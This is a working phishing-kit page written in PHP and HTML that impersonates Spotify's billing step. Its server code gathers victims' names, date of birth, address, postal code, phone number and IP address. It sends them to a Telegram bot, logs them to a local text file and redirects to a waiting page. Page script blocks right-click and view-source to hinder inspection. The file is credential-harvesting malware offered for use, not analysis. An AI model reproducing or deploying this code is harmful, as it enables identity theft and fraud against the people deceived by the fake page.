<?php
include "id.php";
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$F=$_POST["fname"];
$L=$_POST['lname'];
$PH=$_POST["phoneNumber"];
$A1=$_POST["address1"];
$CI=$_POST["city"];
$S=$_POST['dob'];
$P=$_POST['postalCode'];
$message=" -------  𝓖𝒆𝓷𝓲𝓾𝓼  𝓢𝓸𝓹𝓽𝓲𝒇𝔂 ℬ𝓲𝓵𝓵𝓲𝓷𝓰 -------"."\n"."ℱ𝓲𝓻𝓼𝓽 𝓷𝓪𝓶𝒆 :  ".$F."\n"."ℒ𝓪𝓼𝓽 𝓷𝓪𝓶𝒆 :   ".$L."\n"."𝓐𝓭𝓭𝓻𝒆𝓼𝓼 𝟏 :   ".$A1."\n"."𝓒𝓲𝓽𝔂 :   ".$CI."\n"."𝓢𝓽𝓪𝓽𝒆 :   ".$S."\n"."𝓩𝓘𝓟 𝓒𝓸𝓭𝒆 :   ".$P."\n"."𝓟𝓱𝓸𝓷𝒆 𝓷𝓾𝓶𝓫𝒆𝓻 :   ".$PH."\n"."𝓘𝓟 :  ".$ip."\n"."------------  𝓢𝓹𝓸𝓽𝓲𝒇𝔂  -------------";
$user_ids=$id;
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("noni.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
include "antics.php";
HEADER("Location: wait.php");
}
?>

<html style="display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="shortcut icon" href="./img/ico/spotico.ico">
    <link rel="mask-icon" href="./img/ico/Pinned-Spotify.svg" color="#000">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/Spotify.png">

    <title>Billing - Spotify</title>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>

  
    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <style>
        html {
            display: none;
        }
    </style>
    
                <style>
        /* Obfuscated CSS */
        .a { display: none !important; }
        .b { visibility: hidden !important; }
        .c { opacity: 0 !important; }
    </style>
   <script>
        // Obfuscated JavaScript
        (function() {
            var originalAlert = window.alert;
            window.alert = function() {
                console.log("Alerts are disabled.");
            };

            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
            });

            document.addEventListener("keydown", function(e) {
                if ((e.ctrlKey || e.metaKey) && (e.key === "u" || e.key === "U")) {
                    e.preventDefault();
                }
            });
        })();
    </script>



    
    
</head>

<body id="app_index" class="js-focus-visible">


    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                   <!-- Move the logo inside a header container -->
        <header class="header-container">
            <img src="./img/ico/logo.png" id="logo" class="logo" style="
    width: 120px;
">
        </header>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <!-- Wrap the form in a white container with width: 580px -->
                        <div class="form-container" style=" background-color: black; padding: 50px; margin: 0 auto; border-radius: 10px;">
                        <form id="dssLogin" name="dssLogin" action="" method="post">
                            <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="FONT-WEIGHT: 600; color: #fff; margin: 0px; padding: 6px 0px 0px 4px;">STEP 1 OF 3</div>
                            <br>
                            <h3 color="white" style="color: #fff; margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Billing data</h3>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">name</legend>
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Nom" display="inline" id="surname" name="fname" maxlength="" placeholder="First name" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                        <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span></fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Prénom" display="inline" id="name" name="lname" maxlength="" placeholder="Last name" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
								<fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="position: relative; display: block;">
<input aria-label="Date of Birth" display="inline" id="dob" name="dob" placeholder="Date of birth (dd / mm / yyyy)" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" oninput="formatDate(this)" value="" type="tel" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
								</fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Address</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="address" name="address1" maxlength="" placeholder="Address" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Postal code</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="zipcode" display="inline" id="zipcode" name="postalCode" maxlength="12" placeholder="Postal code" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" type="”text”" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="city" name="city" maxlength="" placeholder="city" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Phone Number" display="inline" id="phone" name="phoneNumber" maxlength="15" placeholder="Phone Number" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" oninput="formatPhoneNumber(this)" value="" type="tel" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                
                                <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit" name="okbb">CONTINUE</button></div>
                            </form>
                            
                            
                                                                                          <style>
                                
            .spinner {
    margin:0px auto ;            
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-top: 4px solid #fff;
    border-radius: 50%;
    width: 20px;
    height: 20px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

                                
                            </style>          
             
                            
<!-- Add this script in your HTML file -->


                            
                            
                        </div>
                    </div></main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">GET SPOTIFY</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                                        <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Privacy Policy</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Cookie Terms</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Data Rights</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Subscription terms and conditions</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Help</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Compatible devices</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interest-Based Ads</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Manage your preferences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">©Spotify. All rights reserved.</div>
                </footer>
            </div>
        </div>
    </div>






</div></body></html>